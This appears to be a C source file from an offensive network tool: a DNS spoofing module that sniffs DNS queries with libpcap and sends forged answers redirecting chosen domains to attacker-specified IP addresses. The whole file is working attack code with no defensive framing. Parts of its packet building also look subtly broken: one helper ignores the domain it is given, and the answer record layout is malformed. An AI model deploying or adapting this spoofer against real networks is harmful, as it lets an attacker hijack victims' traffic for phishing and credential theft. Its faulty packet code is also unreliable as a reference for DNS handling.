
#include "../include/dns_spoof.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <pthread.h>
#include <pcap.h>

#define DNS_PORT 53
#define MAX_PACKET_SIZE 8192
#define MAX_REDIRECTS 256

typedef struct {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
} dns_header_t;

typedef struct {
    uint16_t qtype;
    uint16_t qclass;
} dns_question_t;

typedef struct {
    uint16_t type;
    uint16_t class;
    uint32_t ttl;
    uint16_t rdlength;
} dns_rr_t;

typedef struct {
    char domain[256];
    uint32_t redirect_ip;
} dns_redirect_t;

static pthread_t dns_thread;
static int dns_socket = -1;
static bool dns_running = false;
static pcap_t *handle = NULL;
static char errbuf[PCAP_ERRBUF_SIZE];
static dns_redirect_t redirects[MAX_REDIRECTS];
static int redirect_count = 0;
static pthread_mutex_t redirect_mutex = PTHREAD_MUTEX_INITIALIZER;

static void name_to_dns_format(unsigned char *dns, const char *name) {
    int lock = 0;
    int i;
    
    strcat((char *)dns, ".");
    
    for (i = 0; i < strlen((char *)dns); i++) {
        if (dns[i] == '.') {
            *((unsigned char *)&dns[lock]) = i - lock;
            lock = i + 1;
        }
    }
}

static uint32_t find_redirect_ip(const char *domain) {
    pthread_mutex_lock(&redirect_mutex);
    
    for (int i = 0; i < redirect_count; i++) {
        if (strcasecmp(redirects[i].domain, domain) == 0) {
            uint32_t ip = redirects[i].redirect_ip;
            pthread_mutex_unlock(&redirect_mutex);
            return ip;
        }
    }
    
    pthread_mutex_unlock(&redirect_mutex);
    return 0;
}

static int create_dns_response(unsigned char *buffer, const char *domain, uint32_t redirect_ip, uint16_t query_id) {
    dns_header_t *dns_header = (dns_header_t *)buffer;
    unsigned char *qname = (unsigned char *)(buffer + sizeof(dns_header_t));
    dns_question_t *question = (dns_question_t *)(buffer + sizeof(dns_header_t) + strlen((const char *)qname) + 1);
    dns_rr_t *answer = (dns_rr_t *)(buffer + sizeof(dns_header_t) + strlen((const char *)qname) + 1 + sizeof(dns_question_t));
    
    dns_header->id = query_id;
    dns_header->flags = htons(0x8180); 
    dns_header->qdcount = htons(1);    
    dns_header->ancount = htons(1);    
    dns_header->nscount = htons(0);   
    dns_header->arcount = htons(0);   
    
    name_to_dns_format(qname, domain);
    question->qtype = htons(1);        
    question->qclass = htons(1);     
    
   
    memcpy(answer + 1, qname, strlen((const char *)qname) + 1);
    answer->type = htons(1);         
    answer->class = htons(1);       
    answer->ttl = htonl(300);          
    answer->rdlength = htons(4);     
    
    
    memcpy((unsigned char *)answer + sizeof(dns_rr_t) + strlen((const char *)qname) + 1, &redirect_ip, 4);
    
    return sizeof(dns_header_t) + strlen((const char *)qname) + 1 + sizeof(dns_question_t) + sizeof(dns_rr_t) + 
           strlen((const char *)qname) + 1 + 4;
}

static void process_dns_packet(unsigned char *packet, int len, struct sockaddr_in *client_addr) {
    if (len < sizeof(dns_header_t)) {
        return;
    }
    
    dns_header_t *dns_header = (dns_header_t *)packet;
    
    if ((ntohs(dns_header->flags) & 0x8000) != 0) {
        return;
    }
    
    unsigned char *qname = (unsigned char *)(packet + sizeof(dns_header_t));
    
    char domain[256] = {0};
    int i = 0, j = 0;
    
    while (qname[i] != 0) {
        if (i >= len || j >= sizeof(domain) - 1) {
            return; 
        }
        
        int label_len = qname[i++];
        
        while (label_len-- > 0 && i < len && j < sizeof(domain) - 1) {
            domain[j++] = qname[i++];
        }
        
        if (qname[i] != 0) {
            domain[j++] = '.';
        }
    }
    
    uint32_t redirect_ip = find_redirect_ip(domain);
    if (redirect_ip != 0) {
        printf("[+] Spoofing DNS response for %s -> %s\n", domain, inet_ntoa(*(struct in_addr *)&redirect_ip));
        
        unsigned char response[MAX_PACKET_SIZE];
        memset(response, 0, sizeof(response));
        
        int response_len = create_dns_response(response, domain, redirect_ip, dns_header->id);
        
        // Send response
        sendto(dns_socket, response, response_len, 0, (struct sockaddr *)client_addr, sizeof(*client_addr));
    }
}

static void dns_packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    (void)args;
    
    const unsigned char *udp_header = packet + 34;
    
    if (udp_header[2] * 256 + udp_header[3] != DNS_PORT) {
        return;
    }
    
    struct in_addr src_ip;
    memcpy(&src_ip, packet + 26, 4);
    uint16_t src_port = udp_header[0] * 256 + udp_header[1];

    struct sockaddr_in client_addr;
    memset(&client_addr, 0, sizeof(client_addr));
    client_addr.sin_family = AF_INET;
    client_addr.sin_port = htons(src_port);
    client_addr.sin_addr = src_ip;
    
    process_dns_packet((unsigned char *)udp_header + 8, header->len - 42, &client_addr);
}

static void *dns_spoof_thread(void *arg) {
    (void)arg; 
    
    printf("[+] DNS spoofing started\n");
    
    char filter_exp[] = "udp port 53";
    struct bpf_program fp;
    
    if (pcap_compile(handle, &fp, filter_exp, 0, PCAP_NETMASK_UNKNOWN) == -1) {
        fprintf(stderr, "[-] Failed to compile filter: %s\n", pcap_geterr(handle));
        return NULL;
    }
    
    if (pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "[-] Failed to set filter: %s\n", pcap_geterr(handle));
        pcap_freecode(&fp);
        return NULL;
    }
    
    pcap_freecode(&fp);
    
    pcap_loop(handle, -1, dns_packet_handler, NULL);
    
    printf("[+] DNS spoofing stopped\n");
    return NULL;
}

bool start_dns_spoofing(void) {
    if (dns_running) {
        return true;
    }
    
    dns_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (dns_socket < 0) {
        perror("[-] Failed to create DNS socket");
        return false;
    }
    
    int opt = 1;
    if (setsockopt(dns_socket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        perror("[-] Failed to set SO_REUSEADDR");
        close(dns_socket);
        return false;
    }
    
    handle = pcap_open_live("any", BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "[-] Failed to open packet capture device: %s\n", errbuf);
        close(dns_socket);
        return false;
    }
    
    dns_running = true;
    if (pthread_create(&dns_thread, NULL, dns_spoof_thread, NULL) != 0) {
        perror("[-] Failed to create DNS spoofing thread");
        pcap_close(handle);
        close(dns_socket);
        dns_running = false;
        return false;
    }
    
    return true;
}

bool add_dns_redirect(const char *domain, uint32_t redirect_ip) {
    pthread_mutex_lock(&redirect_mutex);
    
    for (int i = 0; i < redirect_count; i++) {
        if (strcasecmp(redirects[i].domain, domain) == 0) {
            redirects[i].redirect_ip = redirect_ip;
            pthread_mutex_unlock(&redirect_mutex);
            return true;
        }
    }
    
    if (redirect_count >= MAX_REDIRECTS) {
        pthread_mutex_unlock(&redirect_mutex);
        return false;
    }
    
    strncpy(redirects[redirect_count].domain, domain, sizeof(redirects[redirect_count].domain) - 1);
    redirects[redirect_count].domain[sizeof(redirects[redirect_count].domain) - 1] = '\0';
    redirects[redirect_count].redirect_ip = redirect_ip;
    redirect_count++;
    
    pthread_mutex_unlock(&redirect_mutex);
    
    printf("[+] Added DNS redirect: %s -> %s\n", domain, inet_ntoa(*(struct in_addr *)&redirect_ip));
    return true;
}

bool remove_dns_redirect(const char *domain) {
    pthread_mutex_lock(&redirect_mutex);
    
    for (int i = 0; i < redirect_count; i++) {
        if (strcasecmp(redirects[i].domain, domain) == 0) {
            if (i < redirect_count - 1) {
                memmove(&redirects[i], &redirects[i + 1], (redirect_count - i - 1) * sizeof(dns_redirect_t));
            }
            redirect_count--;
            pthread_mutex_unlock(&redirect_mutex);
            
            printf("[+] Removed DNS redirect for %s\n", domain);
            return true;
        }
    }
    
    pthread_mutex_unlock(&redirect_mutex);
    return false;
}

void stop_dns_spoofing(void) {
    if (dns_running) {
        dns_running = false;
        pcap_breakloop(handle);
        pthread_join(dns_thread, NULL);
        pcap_close(handle);
        close(dns_socket);
        dns_socket = -1;
        handle = NULL;
    }
}